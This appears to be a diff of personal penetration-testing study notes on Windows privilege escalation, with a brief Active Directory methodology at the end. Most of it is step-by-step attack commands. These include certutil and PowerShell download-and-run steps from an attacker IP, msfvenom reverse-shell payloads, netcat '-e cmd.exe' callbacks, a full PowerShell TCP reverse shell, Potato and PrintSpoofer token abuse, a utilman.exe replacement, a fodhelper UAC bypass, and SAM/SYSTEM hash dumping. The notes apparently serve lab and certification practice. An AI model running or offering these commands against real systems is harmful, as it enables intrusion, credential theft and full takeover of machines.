+```
+Look for `Access : NT AUTHORITY\INTERACTIVE Allow  FullControl`
+
+now we make a reverse shell 
+switch to :temp folder on windows :
+```
+cd C:\temp
+```
+download on windows :
+```
+certutil -f -urlcache http://192.168.163.199:8000/reverse.exe reverse.exe
+```
+
+now we modify the original registry path so that the service loads our reverse shell
+```
+reg add HKLM\System\CurrentControlSet\services\regsvc /v ImagePath /d "C:\temp\reverse.exe" /f
+```
+
+now we check if we start this service oursef or not 
+```
+sc qc regsvc
+```
+also check `BINARY_PATH_NAME` here to see if path changed or not
+if it says `START_TYPE : DEMAND_START` , we can start it manually
+
+start listener on kali 
+```
+rlwrap -cAr nc -lvnp 4444
+```
+
+we start the service now 
+```
+sc start regsvc
+```
+we get a shell back 
+
+###### <span style="color:rgb(11, 142, 224)">AlwaysInstallElevated</span>
+
+Enumerate : 
+```
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+```
+For BOTH Registry keys : 
+`AlwaysInstallElevated` must be set to `1` (`0x1`) 
+`DisableMSI`  should be set  to `0` (`0x0`)  i.e False so we can execute our `.msi`
+
+now well make a reverse shell of `.msi`
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.163.199 LPORT=4444 -f msi > reverse.msi
+```
+enter our kali ip and port
+start python server on kali : 
+```
+python3 -m http.server 8000
+```
+download on windows :
+```
+certutil -f -urlcache http://192.168.163.199:8000/reverse.msi reverse.msi
+```
+start listener on kali 
+```
+rlwrap -cAr nc -lvnp 4444
+```
+run the msi
+```
+.\reverse.msi
+# msiexec /quiet /qn /i C:\PrivEsc\reverse.msi ; if 1st one doesnt work
+```
+well get a reverse shell back 
 ### <span style="color:rgb(11, 142, 224)">Privilege Attacks</span>
+
 ###### <span style="color:rgb(11, 142, 224)">to check current privileges</span>
 ```
 whoami /priv
+whoami /all
 ```
-###### <span style="color:rgb(11, 142, 224)">for getting more privileges from normal user : </span>
+`State` of the Privilege should be `Enabled`
+
+check `systeminfo` to know architecture first 32 bit or 64 bit
+```
+systeminfo
+```
+###### <span style="color:rgb(11, 142, 224)">if SeImpersonatePrivilege : Disabled : </span>
 Full powers : 
 ```
 https://github.com/itm4n/FullPowers
 ```
+download : `FullPowers.exe`
 run : 
 ```
 .\FullPowers.exe
 ```
 
-well now use `SeImpersonatePrivilege` to gain administrator rights
-Order : 
-1. god potato 
-2. juicy potato 
-3. print spoofer (don't use now , it's outdated)
-###### <span style="color:rgb(11, 142, 224)">to gain privilege escalation from elevated privileges</span>
-GodPotato : 
+#### <span style="color:rgb(11, 142, 224)">SeImpersonate/SeAssignPrimaryToken Privilege</span>
+
+###### <span style="color:rgb(11, 142, 224)">GodPotato : </span>
 ```
 https://github.com/BeichenDream/GodPotato
 ```
-download the net4 version
-execute : 
+download the net4 version (try all versions if one does not work)
+upload a reverse shell also to same folder as God Potato
 Then from the Windows LOCAL SERVICE shell:
 ```
-.\GodPotato-NET4.exe
+.\GodPotato-NET4.exe -cmd reverse.exe
 ```
-
-###### If nothing works , then try Winpeas
-Download `winPEASx64.exe` : 
+start listener 
+well get rev shell back
+###### <span style="color:rgb(11, 142, 224)">Juicy Potato : </span>
+Windows 7, Windows 10/Server 2016 1803
+If its Windows 7 / Server 2008 R2 - x86 / 32-bit
+search on google for - "juicy potato 32 bit github"
+download : `Juicy.Potato.x86.exe` , rename if necessary
 ```
-https://github.com/peass-ng/PEASS-ng/releases/tag/20260922-7b7c14db
+https://github.com/ivanitlearning/Juicy-Potato-x86/releases
+```
+transfer to windows : 
+```
+python3 -m http.server 8000
+```
+Windows get file : 
+```
+certutil -f -urlcache http://10.10.14.138:8000/JuicyPotato.exe JuicyPotato.exe
+```
+now we make a reverse shell 
+For 32 bit x86 architecture : 
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.138 LPORT=4444 -f exe -o reverse.exe
+```
+start listener on kali 
+```
+rlwrap -cAr nc -lvnp 4444
+```
+start python server on kali : 
+```
+python3 -m http.server 8000
 ```
 transfer to windows
 ```
-.\winPEASx64.exe > windows.txt
+certutil -f -urlcache http://10.10.14.138:8000/reverse.exe reverse.exe
 ```
-we'll run winpeas and transfer our file back to kali to analyze more properly
+
+now run the juicy potato 
+```
+.\JuicyPotato.exe -t * -p "C:\Users\Public\reverse.exe" -l 4444 -c {6d18ad12-bde3-4393-b311-099c346e6df9}
+```
+we get reverse shell back 
+if the exploit is not working , change CLSID as per version of windows for the exploit to work 
+```
+https://github.com/ohpe/juicy-potato/tree/master/CLSID
+```
+###### <span style="color:rgb(11, 142, 224)">RoguePotato : </span>
+Windows Server 2019 1809 -
+download `RoguePotato.zip` from 
+```
+https://github.com/antonioCoco/RoguePotato
+https://github.com/antonioCoco/RoguePotato/releases/tag/1.0
+```
+we not transfer it to windows 
+start python server
+```bash
+python3 -m http.server 8000
+```
+on windows , get file from kali : 
+```cmd
+powershell iwr http://192.168.163.199:8000/RoguePotato.exe -o RoguePotato.exe
+```
+Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows:
+```
+sudo socat tcp-listen:135,reuseaddr,fork tcp:<victim windows IP>:9999
+```
+run it it wont give any output
+now well transfer a reverse shell also to same folder of rogue potato 
+star listener on kali
+```
+rlwrap -f . nc -lvnp 4444
+```
+on windows run rogue potato 
+```
+RoguePotato.exe -r <kali ip> -e reverse.exe -l 9999
+```
+we get a rev shell back 
+###### <span style="color:rgb(11, 142, 224)">PrintSpoofer</span>
+Windows 10/Server 2016 1607, Server 2019
+
+download from 
+```
+https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0
+```
+download PrintSpoofer32.exe or PrintSpoofer64.exe
+If error : try for both print spoofer 32 bit and 64 bit according to your need
+transfer to windows
+start python server
+```bash
+python3 -m http.server 8000
+```
+on windows , get file from kali : 
+```cmd
+powershell iwr http://192.168.163.199:8000/PrintSpoofer64.exe -o PrintSpoofer64.exe
+```
+on windows , get reverse shell also from kali : 
+```cmd
+powershell iwr http://192.168.163.199:8000/reverse.exe -o reverse.exe
+```
+start listener on kali : 
+```bash
+rlwrap -f . nc -lvnp 4444
+```
+run print spoofer 
+```
+PrintSpoofer64.exe -c reverse.exe -i
+```
+we get rev shell back 
+if we didn't wanted a call back to our listener using a reverse shell
+we could have gotten system in same shell as well
+```
+PrintSpoofer64.exe -c "C:\Windows\System32\cmd.exe" -i
+```
+#### <span style="color:rgb(11, 142, 224)">SeTakeOwnership</span>
+
+we take ownership of utilman
+```
+takeown /f C:\Windows\System32\utilman.exe
+```
+confirm check who is the owner : 
+```
+powershell (Get-Acl "C:\windows\system32\utilman.exe").Owner
+```
+now give access of utilman to our user
+```
+icacls C:\Windows\System32\Utilman.exe /grant <username>:F
+```
+we saw from owner command , our username , so 
+```
+icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+```
+
+now we make a reverse shell and transfer it to windows 
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali IP> LPORT=4444 -f exe -o reverse.exe
+```
+start python server on kali : 
+```
+python3 -m http.server 8000
+```
+start listener on kali 
+```
+rlwrap -cAr nc -lvnp 4444
+```
+if you want in current directory : 
+```
+certutil -f -urlcache http://192.168.163.199:8000/reverse.exe reverse.exe
+```
+
+now well replace our reverse shell with the utilman 
+```
+copy reverse.exe C:\windows\system32\utilman.exe
+```
+overwrite : yes
+
+now we trigger utilman
+from start windows menu > user round icon > lock 
+now click on ease of access button 
+after clicking we will get reverse shell back
+#### <span style="color:rgb(11, 142, 224)">SeBackup/SeRestore Privilege</span>
+
+we take out SAM and SYSTEM from registry directly
+and then well save it locally in our documents
+```
+reg save hklm\sam sam
+reg save hklm\system system
+```
+now well transfer these back to our kali 
+
+On Kali start SMB server : 
+```
+impacket-smbserver share . -smb2support
+```
+On windows transfer files : 
+```
+copy sam \\10.10.14.138\share\sam
+copy system \\10.10.14.138\share\system
+
+# ex. copy windows.txt \\192.168.131.128\share\windows.txt
+```
+
+now we dump these files
+```
+impacket-secretsdump -sam sam -system system LOCAL
+```
+we get admin hash
+```
+Format: RID : LM hash : NT hash
+```
+
+### <span style="color:rgb(11, 142, 224)">Other Windows Components</span>
+
+#### <span style="color:rgb(11, 142, 224)">Kernel Exploitation </span>
+
+check `systeminfo`
+```
+systeminfo
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+```
+look for `OS Name` , `OS Version` , `Hotfix(s)` , `System Type`
+
+Find matching exploits
+```
+▹ searchsploit windows kernel <build number> <OSversion>
+▹ ExploitDB
+▹ GitHub
+```
+
+now to compile there are 2 different ocmmanads
+gcc - when code is in C 
+g++ when code is in C++
+if i want to compile for 64 bit :
+```
+x86_64-w64-mingw32-gcc exploit.c –o exploit.exe
+```
+if i want to compile for 32 bit :
+```
+i686-w64-mingw32-gcc exploit.c –o exploit.exe
+```
+
+----
+
+Alternative with Metasploit : 
+
+First establish a reverse shell in Metasploit : 
+Both the reverse shell you are creating and the payload you are setting in multi handler should be same value
+create reverse shell For Metasploit Meterpreter handler : 
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.138 LPORT=4444 -f exe -o reverse.exe
+```
+transfer to windows 
+now back on kali start listener 
+```
+msfconsole -q
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 10.10.14.174 [Kali VM IP Address] 
+set lport 4444
+run
+```
+now run our reverse shell on windows : 
+```
+reverse.exe
+```
+
+Exploitation  : 
+Kali VM : 
+now we will background this shell session and use our payload 
+```
+background
+use post/multi/recon/local_exploit_suggester
+set session 1
+show options
+run
+```
+
+it has now identified a lot of potential cves for the kernel version : 
+green ones are vulnerable , red ones are not
+well use one of these now , preferably starting from the newest i.e from bottom green ones 
+```
+use exploit/windows/local/cve_2022_21999_spoolfool_privesc
+set session 1 
+show options
+set lhost 10.10.14.174
+set lport 5555                  #change the port now 
+run
+```
+well open shell now 
+```
+meterpreter > shell
+```
+
+
+For windows 7 you can use : 
+```
+exploit/windows/local/ms16_014_wmi_recv_notif
+```
+For windows 10 you can use : 
+```
+exploit/windows/local/cve_2022_21999_spoolfool_privesc
+exploit/windows/local/cve_2022_21882_win32k
+exploit/windows/local/cve_2020_0796_smbghost
+exploit/windows/local/cve_2020_1048_printerdemon 
+```
+
+#### <span style="color:rgb(11, 142, 224)">Scheduled Tasks</span>
+
+first we enumerate : 
+switch to powershell
+```
+powershell
+```
+run : 
+```
+Get-ScheduledTask | ft TaskName,TaskPath,State
+```
+
+from here we will not choose tasks with default path of `\Microsoft\Windows`
+we will see for other vulnerable paths
+for ex. 
+```
+vulntask                                             \              
+```
+now we enumerate more on the task we found 
+```
+schtasks /query /fo LIST /v /tn <TASK NAME>
+```
+from here look for path of task and other details : 
+```
+Next Run Time:                        N/A (n/A : we can run it whenever we want)
+Task To Run:                          C:\tasks\schtask.bat 
+Scheduled Task State:                 Enabled
+Run As User:                          taskusr1
+Schedule Type:                        At system start up
+```
+
+now we have to check if we have write permission on the task file location or not 
+```
+icacls C:\tasks\schtask.bat 
+```
+or
+switch to PowerShell : 
+```
+powershell
+```
+run : 
+```
+Get-Acl -Path "C:\tasks\schtask.bat" | fl
+```
+
+if users have full access :
+now in this scheduled task well add a new line for our reverse shell or use netcat
+Start a listener on Kali and then append a line
+```
+>    # to replace the contents of the file
+>>   # to append / add new lines in bottom
+```
+
+```
+echo c:\tools\nc64.exe -e cmd.exe 192.168.163.199 4444 > C:\tasks\schtask.bat
+or 
+echo <path_for_reverse_shell> >> <path_for_script.ps1> 
+```
+check : 
+```
+type C:\tasks\schtask.bat
+```
+first well start our listener on kali 
+```
+rlwrap -f . nc -lvnp 4444
+```
+
+now if it says the scheduled task is made run on startup 
+if we have the permission to restart/run the task we could do : 
+```
+schtasks /run /tn vulntask
+```
+or 
+you can restart the windows vm if we have permission 
+```
+shutdown -r
+```
+we will get shell back
+
+#### <span style="color:rgb(11, 142, 224)">Startup Apps</span>
+
+from the winpeas the output 
+```
+grep -aiA 10 "startup" windows.txt
+```
+look for : 
+```
+    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
+    FolderPerms: Users [Allow: AllAccess]
+```
+
+
+we go to the startup folders common for all users : 
+```
+cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
+```
+we check our current permissions in this directory 
+```
+icacls .
+```
+we only look for  W (Write-only access)* , M (Modify access), F (Full access) for our group
+so it means we can edit this path 
+
+
+now we make a reverse shell and transfer it there
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.163.199 LPORT=4444 -f exe -o reverse.exe
+```
+Start listener on Kali:
+```bash
+rlwrap -f . nc -lvnp 4444
+```
+start python server : 
+```
+python3 -m http.server 8000
+```
+Transfer to target:
+```cmd
+certutil -f -urlcache http://192.168.163.199:8000/reverse.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.exe"
+```
+
+
+now if lab says simulate admin login 
+from winpeas output : 
+```
+grep -aiA 10 "putty" windows.txt
+```
+if we got amin user and pass for putty 
+so well use rdp or ssh to login 
+```
+xfreerdp /v:10.49.133.136 /u:admin /p:password123 /cert:ignore /dynamic-resolution
+ssh admin@<target-ip>
+```
+
+now on the current user terminal which we already have enter any command ex. `whoami`
+```
+C:\Users\user>whoami
+```
+we get admin shell back on our listener
+#### <span style="color:rgb(11, 142, 224)">Insecure GUI Apps</span>
+
+<span style="color:rgb(11, 142, 224)">Paint : </span>
+
+there is a "admin paint" shortcut on the desktop 
+so we can tell by the name it is opening with admin privileges
+
+run it 
+when we click it it opened cmd for a second then paint app opens 
+
+now we check from which user this process is running : 
+```
+tasklist /v | findstr /i paint
+```
+
+we can see it is running with user : "admin"
+
+now go to the opened paint application 
+In Paint, click "File" and then "Open". 
+
+In the open file dialog box, click in the navigation input and paste
+type the full path shown on top of file system 
+```
+C:\Windows\System32\cmd.exe
+```
+Press Enter to spawn a command prompt running with admin privileges.
+
+
+<span style="color:rgb(11, 142, 224)">File Explorer : </span>
+
+open file explorer 
+
+first go to File > Open Windows PowerShell > frequent places : desktop
+then again come back and repeat : 
+you will get option to "open windows PowerShell as administrator"
+
+#### <span style="color:rgb(11, 142, 224)">Windows UAC Bypass (Admin Medium to High Integrity)</span>
+
+Admin Medium to High Integrity privilege escalation : 
+
+Conditions : 
+1. UAC is enabled
+2. User is already in administrators group
+3. Shell is already of medium integrity
+
+Check UAC enabled
+```
+0 – Disabled (never notify)
+2 – Always notify (anything that requires admin)
+3 - Notify when apps make changes, not me (desktop is not
+dimmed)
+5 – Default (notify when apps make changes, not me)
+```
+
+
+now we have to check if UAC is enabled or not 
+```
+reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
+```
+we can see its value is 5 i.e (0x5)
+
+##### Method 1 : msconfig (GUI ACCESS REQUIRED) :
+
+from apps search `msconfig` and open `system configuration`
+go to
+tools > command prompt > launch 
+a cmd will open with admin and high integrity level 
+
+##### Method 2 : Authorization Manager (azman) (GUI ACCESS REQUIRED)
+
+press : windows + R or search for `run` in apps
+type : 
+```
+azman.msc
+```
+
+go to help > help topics 
+right click in middle 
+go to view source 
+
+notepad will open 
+now click 
+file > open 
+
+In the open file dialog box, click in the navigation input and paste: 
+type the full path shown on top of file system 
+```
+C:\Windows\System32\cmd.exe
+```
+press enter 
+it will open a admin cmd with high integrity level 
+##### Method 3 : fodhelper (NO GUI required , ONLY CMD REQUIRED)
+
+we start another reverse shell listener in another terminal 
+so we get a shell from our initial rev shell 
+```
+rlwrap -f . nc -lvnp 4444
+```
+
+we save the reg key in environment variable so we don't have to set it again and again 
+```
+set REG_KEY="HKCU\Software\Classes\ms-settings\Shell\Open\command"
+```
+
+set variable as well 
+```
+set CMD="C:\Users\admin\nc64.exe -e cmd.exe 192.168.163.199 4444"
+```
+
+now we need to reference environment variable 
+% sign is for referencing
+inside the REG_KEY environment variable we set we are adding a sub key 
+```
+reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+```
+
+we gave reverse shell command in CMD so we put it here
+```
+reg add %REG_KEY% /d %CMD% /f
+```
+
+so what we did till now 
+1. in fodhelper , there is a registry key , in which it is told which command is to be run for this setting/ this particular action 
+2. so that setting has a key "HKCU\Software\Classes\ms-settings\Shell\Open\command"
+3. this key tells which command we have to open inside the windows settings 
+4. additional paramets also go with this command
+5. so we updated the original command and uplaoded our malicious command
+6. we do "DelegateExecute" so it runs with all the users
+
+now we will run 
+```
+fodhelper.exe
+```
+and it will go to its regisrty key "HKCU\Software\Classes\ms-settings\Shell\Open\command" and check which setting page to open its setting page 
+which has our malicious command
+
+in our additional listener , 
+we get rev shell back with high integrity level
+
+#### <span style="color:rgb(11, 142, 224)">Vulnerable Software</span>
+
+enumerate what all software's is installed : 
+```
+wmic product get name,version,vendor
+```
+then we will search for exploits of those versions on searchsploit/explpotDB or GitHub or other websites
+
+dont look for normal softwares like aws , amazon , visual c++
+look for 3rd party ex . "VNC Server 6.8.0" ; "Druva inSync 6.6.3"
+
+sample 2 methods for <span style="color:rgb(11, 142, 224)">Druva inSync 6.6.3</span> : 
+
+###### <span style="color:rgb(11, 142, 224)">Method 1 - Add yourself to Administrators group :</span>
+
+exploit : https://github.com/yevh/CVE-2020-5752-Druva-inSync-Windows-Client-6.6.3---Local-Privilege-Escalation-PowerShell-/blob/main/DruvaPE.ps1
+we download the script : DruvaPE.ps1 
+
+we edit the file 
+```
+gedit DruvaPE.ps1 
+```
+in the $cmd= value 
+we enter what we want it to execute 
+
+so we replace : 
+```
+$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://192.168.163.199:8080/shell.ps1')"
+```
+with : 
+```
+$cmd = "net localgroup Administrators thm-unpriv /add"
+```
+we add our current user name "thm-unpriv" in the administrators group
+also , we comment out the last line because we don't want it to be executed
+
+save and exit
+start python server on kali : 
+```
+python3 -m http.server 8000
+```
+download the main exploit on windows 
+```cmd
+certutil -f -urlcache http://192.168.163.199:8000/DruvaPE.ps1 DruvaPE.ps1
+```
+Start listener on Kali:
+```bash
+rlwrap -f . nc -lvnp 4444
+```
+now open powershell
+```
+powershell
+```
+import in powershell
+```
+Import-Module .\DruvaPE.ps1
+```
+so we got added to administrators group now 
+we are administrators now 
+
+###### <span style="color:rgb(11, 142, 224)">Method 2 - Reverse shell : </span>
+
+we replace the value with our "powershell reverse shell"
+https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
+
+Exploit Script : 
+replace the kali ip here 
+Use single quotes for the outer PowerShell string and keep the inner command in double quotes:
+```
+$cmd = 'powershell -c "IEX(New-Object System.Net.WebClient).DownloadString(''http://192.168.163.199:8000/mypowershell.ps1'')"'
+```
+
+with your reverse shell looking like:
+Payload script : 
+replace the kali ip here 
+```
+$client = New-Object System.Net.Sockets.TCPClient("192.168.163.199",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+you should get a shell on your Netcat listener on port 4444
+
+so we now edit the exploit : 
+```
+gedit DruvaPE.ps1
+```
+paste the PowerShell reverse shell in the required place 
+also , we comment out the last line because we don't want it to be executed
+
+now we make the payload which it will take up from our kali 
+```
+gedit mypowershell.ps1
+```
+and paste reverse shell there and save and exit
+
+now we transfer exploit it to windows 
+start python server on kali : 
+```
+python3 -m http.server 8000
+```
+download the main exploit on windows 
+```cmd
+certutil -f -urlcache http://192.168.163.199:8000/DruvaPE.ps1 DruvaPE.ps1
+```
+Start listener on Kali:
+```bash
+rlwrap -f . nc -lvnp 4444
+```
+now open powershell
+```
+powershell
+```
+import in powershell
+```
+Import-Module .\DruvaPE.ps1
+```
+we get a reverse shel back as nt authority\system 
 
 # <span style="color:rgb(11, 142, 224)">Active Directory</span>
+
+#### <span style="color:rgb(11, 142, 224)">Methodology : </span>
+
+AD -> use nxc to find shares, winrm, rdp rights. Get a foothold and set up ligolo. Run bloodhound, check for any outgoing rights, kerberoast, asrep roast, look for sus files that may contain credentials. If nothing, try windows priv esc, if nothing look at other services, maybe a FTP, MSSQL, MySQL or something and see if theres any low hanging fruits. Rinse and repeat till youre DC.
+
+**Tools in my GOAT list**
+1. Ligolo-ng for pivoting and port forwarding, super good
+2. nxc >>> crackmapexec. The wiki is super good, I reckon you could do 90% of boxes if you use nxc well.
+3. bloodhound -> so useful for AD, cant do anything without it
 
